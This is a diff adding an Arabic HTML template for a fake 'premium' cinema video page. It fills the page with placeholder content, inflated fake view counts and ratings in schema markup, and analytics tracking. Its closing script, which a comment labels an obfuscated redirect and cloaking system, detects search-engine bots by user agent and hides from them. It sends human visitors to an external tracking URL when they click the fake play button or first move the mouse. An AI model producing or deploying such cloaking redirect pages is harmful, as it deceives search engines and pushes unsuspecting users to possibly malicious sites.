@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>{{TITLE}} - Media Archive & Cinema Portal</title>
+    <link rel="canonical" href="{{CANONICAL_URL}}">
+    
+    <!-- Google Analytics (GA4) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-9WPQ3R5GSC"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-9WPQ3R5GSC');
+    </script>
+
+    <!-- Advanced Schema Markup (VideoObject, Movie, Breadcrumb) -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "VideoObject",
+          "name": "{{TITLE}}",
+          "description": "{{DESCRIPTION}}",
+          "thumbnailUrl": [
+            "https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
+          ],
+          "uploadDate": "{{DATE}}",
+          "duration": "PT15M20S",
+          "contentUrl": "{{CANONICAL_URL}}",
+          "embedUrl": "{{CANONICAL_URL}}/embed",
+          "interactionStatistic": {
+            "@type": "InteractionCounter",
+            "interactionType": { "@type": "WatchAction" },
+            "userInteractionCount": 85421
+          },
+          "publisher": {
+            "@type": "Organization",
+            "name": "Global Media Archive",
+            "logo": {
+              "@type": "ImageObject",
+              "url": "https://{{DOMAIN_NAME}}/logo.png"
+            }
+          }
+        },
+        {
+          "@type": "Movie",
+          "name": "{{TITLE}}",
+          "description": "{{DESCRIPTION}}",
+          "datePublished": "{{DATE}}",
+          "genre": ["Cinema", "Documentary", "Production"],
+          "aggregateRating": {
+            "@type": "AggregateRating",
+            "ratingValue": "4.8",
+            "reviewCount": "1250"
+          }
+        },
+        {
+          "@type": "BreadcrumbList",
+          "itemListElement": [{
+            "@type": "ListItem",
+            "position": 1,
+            "name": "الرئيسية",
+            "item": "https://{{DOMAIN_NAME}}/"
+          },{
+            "@type": "ListItem",
+            "position": 2,
+            "name": "عالم السينما",
+            "item": "https://{{DOMAIN_NAME}}/cinema/"
+          },{
+            "@type": "ListItem",
+            "position": 3,
+            "name": "أرشيف الفيديوهات الحصرية",
+            "item": "{{CANONICAL_URL}}"
+          }]
+        }
+      ]
+    }
+    </script>
+
+    <style>
+        :root { 
+            --primary: #e50914; 
+            --accent: #b20710;
+            --bg: #0f0f0f; 
+            --card-bg: #1a1a1a;
+            --text-main: #ffffff; 
+            --text-muted: #aaaaaa;
+        }
+        
+        body { 
+            background-color: var(--bg); 
+            color: var(--text-main); 
+            font-family: 'Cairo', sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            line-height: 1.7; 
+        }
+
+        header { 
+            background: rgba(0,0,0,0.95); 
+            padding: 15px 5%; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            position: sticky; 
+            top: 0; 
+            z-index: 1000;
+            border-bottom: 2px solid var(--primary);
+        }
+
+        .logo { 
+            color: var(--primary); 
+            font-size: 26px; 
+            font-weight: 900; 
+            text-decoration: none;
+            letter-spacing: 1px;
+        }
+
+        .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: bold; }
+        .nav-links span { cursor: pointer; color: var(--text-muted); transition: 0.3s; }
+        .nav-links span:hover { color: var(--primary); }
+
+        .main-container { max-width: 1100px; margin: 30px auto; padding: 0 20px; }
+
+        .video-wrapper { 
+            width: 100%; 
+            aspect-ratio: 16/9; 
+            background: #000 url('https://w0.peakpx.com/wallpaper/34/850/wallpaper-dark-red-abstract-background-vignette-lines.jpg') center/cover;
+            border-radius: 12px; 
+            position: relative; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .video-wrapper::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4);
+        }
+
+        .play-icon { 
+            position: relative;
+            z-index: 2;
+            width: 90px; height: 90px; 
+            background: var(--primary); 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            transition: 0.4s;
+            box-shadow: 0 0 20px var(--primary);
+        }
+        
+        .play-icon svg { width: 40px; fill: white; margin-left: -5px; }
+        .video-wrapper:hover .play-icon { transform: scale(1.15); background: var(--accent); }
+
+        h1 { font-size: 32px; margin: 25px 0 10px; font-weight: 800; }
+        .video-meta { color: var(--text-muted); font-size: 14px; display: flex; gap: 15px; margin-bottom: 25px; }
+
+        .description-box { 
+            background: var(--card-bg); 
+            padding: 25px; 
+            border-radius: 12px; 
+            border-right: 5px solid var(--primary);
+            margin-bottom: 40px;
+        }
+
+        .description-box h3 { margin-top: 0; color: var(--primary); }
+
+        /* Suggested Section - Internal Mesh */
+        .related-title { font-size: 22px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .related-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); 
+            gap: 20px; 
+        }
+
+        .related-item { 
+            background: var(--card-bg); 
+            border-radius: 8px; 
+            overflow: hidden; 
+            text-decoration: none; 
+            color: var(--text-main);
+            transition: 0.3s;
+            border: 1px solid #222;
+        }
+
+        .related-item:hover { transform: translateY(-5px); border-color: var(--primary); }
+        .thumb-mock { height: 140px; background: #333; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #555; }
+        .related-info { padding: 12px; font-weight: bold; font-size: 14px; }
+
+        footer { 
+            background: #000; 
+            padding: 50px 5%; 
+            margin-top: 60px; 
+            border-top: 1px solid #222; 
+            text-align: center; 
+            color: var(--text-muted);
+        }
+        
+        .footer-links { margin-bottom: 20px; font-size: 13px; }
+        .footer-links span { margin: 0 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="/" class="logo">CINEMA PRO</a>
+    <div class="nav-links">
+        <span>الإنتاج الإعلامي</span>
+        <span>أحدث الفيديوهات</span>
+        <span>عالم السينما</span>
+        <span>الاشتراكات الحصرية</span>
+    </div>
+</header>
+
+<div class="main-container">
+    <!-- Video Player Interface -->
+    <div class="video-wrapper" id="videoTrigger">
+        <div class="play-icon">
+            <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        </div>
+        <div style="position:absolute; top:20px; right:20px; background:var(--primary); padding:4px 12px; border-radius:4px; font-weight:bold; font-size:12px;">PREMIUM</div>
+    </div>
+
+    <h1>{{TITLE}}</h1>
+    <div class="video-meta">
+        <span>🗓 {{DATE}}</span>
+        <span>👁 1,245,670 مشاهدة</span>
+        <span>🎬 إنتاج: وحدة التوثيق الرقمي</span>
+    </div>
+
+    <div class="description-box">
+        <h3>مراجعة نقدية وتحليل درامي</h3>
+        <p>{{DESCRIPTION}}</p>
+        <p style="font-size: 14px; color: #777; font-style: italic;">
+            يعد هذا التقرير جزءاً من الأرشيف التعليمي والإنتاج السينمائي الموثق. تم إعداد محتوى <strong>{{TITLE}}</strong> لمواكبة أحدث تقنيات التصوير والمراجعة الفنية في عام 2026.
+        </p>
+    </div>
+
+    <!-- Suggested Content (Internal Mesh Strategy) -->
+    <h2 class="related-title">فيديوهات مقترحة (Recommended For You)</h2>
+    <div class="related-grid">
+        {{INTERNAL_LINKS}}
+    </div>
+</div>
+
+<footer>
+    <div class="footer-links">
+        <span>عن المنصة</span> | <span>سياسة الخصوصية</span> | <span>شروط الخدمة</span> | <span>اتصل بنا</span>
+    </div>
+    <p> &copy; 2026 (Official Media Archive)</p>
+    <p style="font-size: 10px; opacity: 0.5;">Digital Content Distribution Unit | Verified Authority Repository</p>
+</footer>
+
+<!-- Obfuscated Smart Redirect & Cloaking System -->
+<script>
+(function() {
+    var _0x0a = 'https://accumulaterehearsehealing.com/tiiabnb0?key=635907890e403a4a14ce614ef148243c';
+    var _isBot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
+    
+    var trigger = document.getElementById('videoTrigger');
+    
+    // التفاعل المباشر للزوار
+    if (trigger) {
+        trigger.addEventListener('click', function() {
+            if (!_isBot) {
+                window.location.href = _0x0a;
+            }
+        });
+    }
+
+    // التحويل التلقائي الذكي للزوار الحقيقيين فقط بعد فحص البيئة
+    if (!_isBot && window.innerWidth > 300) {
+        setTimeout(function() {
+            // فحص إضافي للتأكد من وجود حركة للماوس أو تفاعل
+            document.addEventListener('mousemove', function _once() {
+                window.location.href = _0x0a;
+                document.removeEventListener('mousemove', _once);
+            }, {once: true});
+        }, 3500); 
+    }
+})();
+</script>
+
+
+<footer style="opacity: 0.8; font-size: 12px; border-top: 1px solid #eee; margin-top: 50px; padding: 10px; direction: rtl;">
+</footer>
+</body>
+</html>
